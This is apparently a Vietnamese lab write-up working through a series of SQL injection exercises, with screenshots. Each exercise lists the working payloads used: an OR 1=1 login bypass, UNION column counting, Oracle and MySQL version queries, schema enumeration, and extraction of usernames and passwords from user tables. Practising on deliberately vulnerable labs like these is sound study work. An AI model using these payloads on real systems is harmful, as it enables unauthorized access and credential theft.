![image](https://github.com/user-attachments/assets/d0b40b0a-cf42-407d-be1f-9bc0f417929a)

Bài này khi chọn Refine your search: là nó sẽ dùng method GET để truy vấn, dùng payload `Lifestyle' OR 1 = 1 -- -` là được:

![image](https://github.com/user-attachments/assets/dcb31aeb-f48a-4747-9f9d-13cf08b8a616)

![image](https://github.com/user-attachments/assets/c621cea9-d8ca-457a-a6d1-175d6c691d8d)

<br>
---------------------------------------
<br>

![image](https://github.com/user-attachments/assets/a38e82d1-886a-481b-bab5-008608cc1ff8)

![image](https://github.com/user-attachments/assets/025fba22-4c61-44cc-8d01-8454fb089686)

Dùng payload `administrator' OR 1 = 1 -- -` là được vì có vẻ câu truy vấn của nó là `SELECT * FROM tables WHERE username=username AND password=password`:

![image](https://github.com/user-attachments/assets/958e5cf7-2906-467c-8a42-1649c3fde2c3)

<br>
---------------------------------------
<br>

![image](https://github.com/user-attachments/assets/07cf2128-84ca-4559-96f2-0d8c3506f4c4)

![image](https://github.com/user-attachments/assets/e8786188-d83c-486d-8a16-3667129c7c4f)

Trước tiên là check số cột thì tôi có thể thấy nó có 2 cột:

![image](https://github.com/user-attachments/assets/ce930342-2a56-4ee7-bef7-cd911769ecfa)

![image](https://github.com/user-attachments/assets/f26ca492-4c8f-4470-b80f-1526bc3f2102)

a và b đã được lấy ra:

![image](https://github.com/user-attachments/assets/1d003042-e46b-4e42-8efe-9ffaf32f3763)

Tôi chỉ cần payload `Accessories' UNION SELECT banner, 'a' FROM v$version -- -` là ra:

![image](https://github.com/user-attachments/assets/8ab3bf06-8be8-448a-9169-29ee8d80c50e)

<br>
---------------------------------------
<br>

![image](https://github.com/user-attachments/assets/4e201e20-f1d8-49fb-b0d6-a61581b5132b)

Xác định số cột tương tự như câu trước, khác ở chỗ lệnh sql này khác cái kia:

![image](https://github.com/user-attachments/assets/08d7db9f-93b7-4c56-9627-b9bda50dc10a)

Dùng payload `Pets' UNION SELECT @@version, 'a' -- -` với bài này:

![image](https://github.com/user-attachments/assets/7ed85160-bd5f-49a0-a602-81691ba36ba0)

<br>
---------------------------------------
<br>

![image](https://github.com/user-attachments/assets/05ec4e10-3e8d-4a77-a182-b3863a6181b2)

![image](https://github.com/user-attachments/assets/499e030c-a7ad-467f-82d1-c6a527a7ecaf)

Bài này vẫn có 2 cột như trước, đi soi cheat sheet để kiếm lệnh in ra các table:

![image](https://github.com/user-attachments/assets/d7108418-8919-49c8-8e0e-988b8ac17e9f)

Dùng payload `Gifts' UNION SELECT table_name, 'a' FROM information_schema.tables -- -` để in ra các tables có trong database:

![image](https://github.com/user-attachments/assets/c9ffb461-9956-45f1-ab19-f4b2e2d0734c)

Tôi tìm kiếm bảng liên quan đến users:

![image](https://github.com/user-attachments/assets/901148b1-116b-4618-a82a-49863ae7de50)

Dùng payload `Gifts' UNION SELECT column_name, 'a' FROM information_schema.columns WHERE table_name = 'users_tfoynr' -- -` để xem tên cột có trong bảng users_tfoynr:

![image](https://github.com/user-attachments/assets/c2080623-c0be-473e-b3b2-bcaab1234baf)

Dễ thấy bảng này có 3 cột là username, email và password, tôi sẽ lấy username và password thì bảng này:

![image](https://github.com/user-attachments/assets/4897c0c3-e61d-4ec9-a0a0-caac13a7d9b5)

<br>
---------------------------------------
<br>

![image](https://github.com/user-attachments/assets/dbc93a60-6e05-46ea-96ac-a0567ff13d5d)

![image](https://github.com/user-attachments/assets/7c8eba84-4a29-4c38-94a0-7546859b0cc1)

Với Oracle thì payload có hơi khác chút nhưng bản chất vẫn vậy `Pets' UNION SELECT table_name, 'a' FROM all_tables -- -`:

![image](https://github.com/user-attachments/assets/21e4c049-be9d-43eb-88bc-75cf7270e0b9)

Dùng payload `Pets' UNION SELECT column_name, 'a' FROM all_tab_columns WHERE table_name = 'USERS_SMCHQL' -- -` để xem tên của các cột có trong bảng USERS_SMCHQL:

![image](https://github.com/user-attachments/assets/cf0b3aea-7f20-454a-a0c6-33a00af31b92)

Tiếp tục dùng `lmao' UNION SELECT PASSWORD_UOUWOL, USERNAME_RKYQAE FROM USERS_SMCHQL -- -` để lấy username:password, ở đoạn đầu lmao vì bỏ cái có tồn tại đi cho dễ nhìn:

![image](https://github.com/user-attachments/assets/0f6330b7-2772-4111-a610-40f11f75d3ed)

<br>
---------------------------------------
<br>

![image](https://github.com/user-attachments/assets/646f54da-55e7-4785-9d15-45ab50328f30)

Bài này mò cột, chắc thế, không biết nữa `Accessories' UNION SELECT NULL, NULL, NULL -- -`

![image](https://github.com/user-attachments/assets/51bc96b4-9caa-480a-be0b-9f51a9fbe330)

<br>
---------------------------------------
<br>

![image](https://github.com/user-attachments/assets/36279cc1-2d55-4d47-8953-d9e0dd9b7f59)

Sau khi tôi thử các payload như `Pets' UNION SELECT 'hKZWf0', NULL, NULL -- -` sau đó dịch cái dòng chữ sang cột tiếp thì ra:

![image](https://github.com/user-attachments/assets/3309a052-a850-4fa4-b8f9-568492bf8f67)

<br>
---------------------------------------
<br>

![image](https://github.com/user-attachments/assets/34098d17-b2b1-4545-bc83-ec124aab6122)

Mở đầu là `lmao' UNION SELECT 'a', 'b' -- -`:

![image](https://github.com/user-attachments/assets/661c85fc-a601-489e-b086-1c51ef562c64)

Sau khi dùng payload `lmao' UNION SELECT table_name, NULL FROM information_schema.tables -- -` thì ra được các bảng:

![image](https://github.com/user-attachments/assets/bd93d254-27b8-46d8-85b4-9b11a548189e)

Payload giống giống bài cũ `lmao' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' -- -`:

![image](https://github.com/user-attachments/assets/05ffb13c-9c07-414f-b7db-12e3d33f6b75)

Và cuối cùng là `lmao' UNION SELECT username, password FROM users -- -`

![image](https://github.com/user-attachments/assets/c6370d13-434e-4da1-8e16-c941349e85f9)

<br>
---------------------------------------
<br>

![image](https://github.com/user-attachments/assets/9233d3a1-7ccd-4815-b446-7457791d2a17)

Sau khi dùng `Pets' UNION SELECT 'a', 'b' -- -` thì lỗi:

![image](https://github.com/user-attachments/assets/53ec4f10-5b23-4b1a-b25e-276906cd0ad5)

Lý do lỗi là do sai kiểu giá trị vì khi tôi để NULL NULL là nó vẫn được:

![image](https://github.com/user-attachments/assets/96c403d4-3d0f-4618-9d2c-1498995ccb76)

Sau khi search qua qua trên mạng thì tôi dùng `lmao'+UNION+SELECT+NULL,username||':'||password+FROM+users--` để lấy username và password:

![image](https://github.com/user-attachments/assets/d91255cb-3d65-4141-96a7-a8a46ec1b84d)

<br>
---------------------------------------
<br>
















